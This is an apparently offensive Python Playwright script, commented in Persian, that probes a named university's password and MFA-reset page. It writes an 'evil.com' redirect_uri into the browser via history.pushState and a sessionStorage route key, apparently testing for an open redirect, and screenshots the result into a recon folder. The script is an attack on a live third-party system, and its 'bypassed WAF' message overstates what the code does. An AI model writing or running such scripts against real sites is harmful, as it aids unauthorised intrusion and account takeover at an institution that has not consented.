import asyncio
from playwright.async_api import async_playwright

async def run_post_load_injection():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        )
        page = await context.new_page()

        # گام اول: ورود تمیز به صفحه بدون پارامتر برای عبور از فیلتر اولیه WAF
        base_url = "https://identity.monash.edu/password"
        print(f"[*] Navigating to clean base URL to bypass WAF gate: {base_url}")

        await page.goto(base_url, timeout=30000, wait_until="networkidle")
        print(f"[+] Successfully bypassed WAF. Current page status URL: {page.url}")

        # صبر برای استقرار کامل اسکریپت‌های انگولار و اکتا
        await asyncio.sleep(4)

        # گام دوم: دستکاری History API و تزریق پارامتر یا مقدار دلخواه در کلاینت
        malicious_redirect = "https://evil.com/"
        print(f"[*] Injecting parameter via client-side History API / Angular route state...")

        await page.evaluate(f"""() => {{
            // تغییر URL در نوار آدرس مرورگر بدون ارسال درخواست مجدد به سرور (با استفاده از History API)
            const newUrl = window.location.pathname + '?redirect_uri={malicious_redirect}';
            window.history.pushState({{path: newUrl}}, '', newUrl);
            console.log('[+] Injected URL via pushState:', window.location.href);

            // همچنین تلاش برای ست کردن مستقیم در ساختار داخلی در صورت وجود شیء سرویس
            if (window.sessionStorage) {{
                sessionStorage.setItem('MfaResetSetupRoute', '{malicious_redirect}');
            }}
        }}""")

        # بررسی وضعیت جدید حافظه و آدرس
        current_url = page.url
        stored_val = await page.evaluate("sessionStorage.getItem('MfaResetSetupRoute')")
        print(f"[+] Modified browser location: {current_url}")
        print(f"[+] sessionStorage value after client injection: {stored_val}")

        # اسکرین‌شات از وضعیت نهایی
        screenshot_path = "/root/recon/monash/post_load_result.png"
        await page.screenshot(path=screenshot_path)
        print(f"[+] Screenshot saved to {screenshot_path}")

        await browser.close()

if __name__ == "__main__":
    asyncio.run(run_post_load_injection())
